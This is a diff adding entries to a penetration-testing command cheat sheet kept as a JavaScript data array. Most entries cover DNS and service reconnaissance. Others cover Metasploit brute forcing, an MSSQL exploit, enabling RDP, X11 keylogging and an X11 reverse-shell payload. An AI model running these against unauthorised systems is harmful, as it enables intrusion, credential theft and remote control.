@@ -1637,4 +1637,205 @@ var data = [
         "command": "msfconsole -x \"use post/windows/gather/credentials/vnc; set SESSION <session>; run\"",
         "link": "https://www.metasploit.com/"
     },
+    {
+        "id": 219,
+        "tool": "DNS",
+        "category":"RECON",
+        "information": "Host find name server",
+        "command": "host -t ns [domain]",
+    },
+    {
+        "id": 220,
+        "tool": "DNS",
+        "category":"RECON",
+        "information": "Host find mail server",
+        "command": "host -t mx [domain]",
+    },
+    {
+        "id": 221,
+        "tool": "DNS",
+        "category":"RECON",
+        "information": "Dig dns lookup",
+        "command": "dig [domain] @1.1.1.1",
+    },
+    {
+        "id": 222,
+        "tool": "DNS",
+        "category":"RECON",
+        "information": "Dig any information",
+        "command": "dig any [domain] @[IP_DNS]",
+    },
+    {
+        "id": 223,
+        "tool": "DNS",
+        "category":"RECON",
+        "information": "Dig zone transfer",
+        "command": "dig axfr @[IP_DNS] [domain]",
+    },
+    {
+        "id": 224,
+        "tool": "DNS",
+        "category":"RECON",
+        "information": "Dig reverse lookup",
+        "command": "dig -x [ip] @[IP_DNS]",
+    },
+    {
+        "id": 225,
+        "tool": "DNS",
+        "category":"RECON",
+        "information": "dnsrecon standard enumeration on domain",
+        "command": "dnsrecon -d [domain]",
+        "link": "https://github.com/darkoperator/dnsrecon"
+    },
+    {
+        "id": 226,
+        "tool": "DNS",
+        "category":"RECON",
+        "information": "dnsrecon zone transfer",
+        "command": "dnsrecon -d [domain] -t axfr",
+        "link": "https://github.com/darkoperator/dnsrecon"
+    },
+    {
+        "id": 227,
+        "tool": "DNS",
+        "category":"RECON",
+        "information": "dns sublist3r - subdomain enumeration",
+        "command": "sublist3r -d [domain] -v",
+        "link": "https://github.com/aboul3la/Sublist3r"
+    },
+    {
+        "id": 228,
+        "tool": "DNS",
+        "category":"RECON",
+        "information": "dns sublist3r - subdomain enumeration with bruteforce",
+        "command": "sublist3r -d [domain] -b -v",
+        "link": "https://github.com/aboul3la/Sublist3r"
+    },
+    {
+        "id": 229,
+        "tool": "nmap",
+        "category":"RECON",
+        "information": "mssql - enum",
+        "command": "nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p [PORT|1433] [IP]",
+        "link": "https://nmap.org/"
+    },
+    {
+        "id": 230,
+        "tool": "Metasploit - msf",
+        "category":"ATTACK/BRUTEFORCE",
+        "information": "Metasploit - enum mssql login",
+        "command": "msfconsole -x \"use admin/mssql/mssql_enum_sql_logins; set RHOSTS [ip]; set USER_FILE [user_file]; set PASS_FILE [pass_file]; run\"",
+        "link": "https://www.metasploit.com/"
+    },
+    {
+        "id": 231,
+        "tool": "Metasploit - msf",
+        "category":"RECON",
+        "information": "Metasploit - enum mssql configuration setting (xp-cmdshell)",
+        "command": "msfconsole -x \"use auxiliary/admin/mssql/mssql_enum; set RHOST [ip]; set password [password]; run\"",
+        "link": "https://www.metasploit.com/"
+    },
+    {
+        "id": 232,
+        "tool": "Metasploit - msf",
+        "category":"ATTACK/EXPLOIT",
+        "information": "Metasploit - mssql link crawler",
+        "command": "msfconsole -x \"use exploit/windows/mssql/mssql_linkcrawler\"",
+        "link": "https://www.metasploit.com/"
+    },
+    {
+        "id": 233,
+        "tool": "netbios",
+        "category":"RECON",
+        "information": "nbtscan - scan netbios",
+        "command": "nbtscan -r [ip-range]",
+        "link": "https://github.com/charlesroelli/nbtscan"
+    },
+    {
+        "id": 234,
+        "tool": "windows RDP",
+        "category":"POST-EXPLOITATION",
+        "information": "enable RDP",
+        "command": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f",
+    },
+    {
+        "id": 235,
+        "tool": "nmap",
+        "category":"RECON",
+        "information": "nmap - pop3 infos",
+        "command": "nmap --script \"pop3-capabilities or pop3-ntlm-info\" -sV -port [port] [ip]",
+        "link": "https://nmap.org/"
+    },
+    {
+        "id": 236,
+        "tool": "nmap",
+        "category":"RECON",
+        "information": "nmap - mysql enumeration",
+        "command": "nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 [ip]",
+        "link": "https://nmap.org/"
+    },
+    {
+        "id": 237,
+        "tool": "nmap",
+        "category":"ATTACK/CONNECT",
+        "information": "nmap - FTP enum anonym",
+        "command": "nmap --script ftp-anon -p 21 [ip]",
+        "link": "https://nmap.org/"
+    },
+    {
+        "id": 238,
+        "tool": "Metasploit - msf",
+        "category":"ATTACK/BRUTEFORCE",
+        "information": "Metasploit - FTP bruteforce login",
+        "command": "msfconsole -x \"use auxiliary/scanner/ftp/ftp_login; set RHOSTS [ip]; set USER_FILE [user_file]; set PASS_FILE [password_file]; exploit\"",
+        "link": "https://www.metasploit.com/"
+    },
+    {
+        "id": 239,
+        "tool": "nmap",
+        "category":"ATTACK/CONNECT",
+        "information": "nmap - x11 check anonymous connection",
+        "command": "nmap --script x11-access -p 6000-6063 -sV [ip]",
+        "link": "https://nmap.org/"
+    },
+    {
+        "id": 240,
+        "tool": "X11",
+        "category":"ATTACK/EXPLOIT",
+        "information": "X11 - keylogging",
+        "command": "xspy [ip]",
+        "link": "https://github.com/mnp/xspy"
+    },
+    {
+        "id": 241,
+        "tool": "X11",
+        "category":"ATTACK/CONNECT",
+        "information": "X11 - remote desktop view",
+        "command": "xrdp  [IP]:[Display]",
+        "link": "https://github.com/neutrinolabs/xrdp"
+    },
+    {
+        "id": 242,
+        "tool": "Metasploit - msf",
+        "category":"ATTACK/EXPLOIT",
+        "information": "Metasploit - x11 reverse shell",
+        "command": "msfconsole -x \"use exploit/unix/x11/x11_keyboard_exec; set RHOST [ip]; set payload cmd/unix/reverse_bash; set lhost <lhost>; set lport <lport>; exploit\"",
+        "link": "https://www.metasploit.com/"
+    },
+    {
+        "id": 243,
+        "tool": "nmap",
+        "category":"RECON",
+        "information": "nmap - snmp scan",
+        "command": "nmap -sU -p 161 -sC --open [ip]",
+        "link": "https://nmap.org/"
+    },
+    {
+        "id": "244",
+        "tool": "nmap",
+        "category": "ATTACK/BRUTEFORCE",
+        "information": "nmap - snmp brute force",
+        "command": "nmap -sU -p 161 --script snmp-brute --script-args snmpbrute.communitiesdb=[wordlist] [ip]",
+        "link": "https://nmap.org/"
+    },
 ]
